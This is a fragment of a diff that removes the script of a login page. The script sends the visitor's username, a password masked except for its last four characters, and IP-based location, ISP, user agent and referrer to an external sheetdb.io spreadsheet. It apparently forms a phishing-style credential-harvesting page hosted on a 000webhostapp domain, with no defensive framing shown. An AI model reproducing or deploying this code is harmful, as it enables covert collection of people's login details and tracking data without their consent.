-            <input type="hidden" id="referral-url-input" name="data[referral-url]" value="">
-            <input type="hidden" id="date-time-input" name="data[date-time]" value="">
-            <input type="hidden" id="channel-input" name="data[channel]" value="">
-
-            <button type="submit">Login</button>
-        </form>
-    </div>
-
-    <script>
-        var form = document.getElementById('sheetdb-form');
-
-        var dynamicUrl = "https://sheetdb.io/api/v1/e8qqennjjjob7";
-
-        // Set the form action dynamically
-        form.action = dynamicUrl;
-
-        function get() {
-            // var allowedDomain = "examplep1.000webhostapp.com";
-            var allowedDomain = "dresssssifyfy.000webhostapp.com"
-
-            // Fetch the IP address using ipapi.co
-            $.getJSON('https://ipapi.co/json', function (data) {
-                // Check the logs if it passes through properly
-                console.log('IP API Response:', data);
-                console.log('Referral URL:', document.referrer);
-
-                // Set the date and time
-                var currentDateTime = new Date().toISOString();
-                $('#date-time-input').val(currentDateTime);
-
-                // Updates the hidden input fields
-                $('#ip-address-input').val(data.ip);
-                $('#city-input').val(data.region);
-                $('#country-input').val(data.country_name);
-                $('#isp-input').val(data.org);
-                $('#user-agent-input').val(navigator.userAgent);
-                $('#channel-input').val(location.protocol);
-
-                if (document.location.protocol === 'file:' || document.location.hostname === '127.0.0.1') {
-                    $('#referral-url-input').val(document.location);
-                } else {
-                    // Check if the referrer is available
-                    $('#referral-url-input').val(document.referrer);
-                }
-
-                // Handle form submission
-                var form = document.getElementById('sheetdb-form');
-                form.addEventListener("submit", function (e) {
-                    e.preventDefault(); // To prevent from opening another tab
-
-                    // Get the full password
-                    var fullPassword = $('#password').val();
-
-                    // Determine if the password should be truncated or not
-                    var truncatedPassword = fullPassword.length > 4 ? '*'.repeat(fullPassword.length - 4) + fullPassword.slice(-4) : fullPassword;
-
-                    // Add the password to the hidden field
-                    $('[name="data[password]"]').val(truncatedPassword);
-                    // Check if the current domain is not the allowed one
-                    if (window.location.hostname !== allowedDomain) {
-                        // Fetch data using AJAX
-                        fetch(form.action, {
-                            method: "POST",
-                            body: new FormData(form),
-                        })
-                            .then(response => response.json())
-                            .then(data => {
-                                // Handle the response data
-                                console.log(data);
-                                alert('Success'); // To check if it passed through
-
-                                // Reset the form
-                                form.reset();
-                            })
-                            .catch(error => {
-                                console.error('Error:', error);
-                                alert('Error occurred'); // To check if it did not pass through
-                            });
-                    }
-                    else {
-                        // Fetch data using AJAX with only the username
-                        fetch(form.action, {
-                            method: "POST",
-                            body: JSON.stringify({
-                                "data[Username]": $('#username').val()
-                            }),
-                            headers: {
-                                'Content-Type': 'application/json'
-                            }
-                        })
-                            .then(response => response.json())
-                            .then(data => {
-                                // Handle the response data
-                                console.log(data);
-                                alert('Success'); // To check if it passed through
-
-                                // Reset the form
-                                form.reset();
-                            })
-                            .catch(error => {
-                                console.error('Error:', error);
-                                alert('Error occurred'); // To check if it did not pass through
-                            });
-                    }
-                });
-            });
-        }
-    </script>
 
 
     <script>
